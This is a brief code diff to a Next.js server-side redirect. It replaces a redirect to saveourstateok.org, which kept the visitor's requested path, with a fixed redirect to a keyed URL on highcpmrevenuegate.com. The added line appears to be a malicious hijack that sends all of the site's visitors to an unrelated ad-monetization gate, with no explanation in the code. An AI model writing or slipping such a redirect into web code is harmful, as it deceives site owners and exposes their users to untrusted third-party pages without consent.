@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://www.highcpmrevenuegate.com/dnhp8sx8?key=18c264e8eaee0dd37792d45461252942` 
 				}`,
 			},
 		};
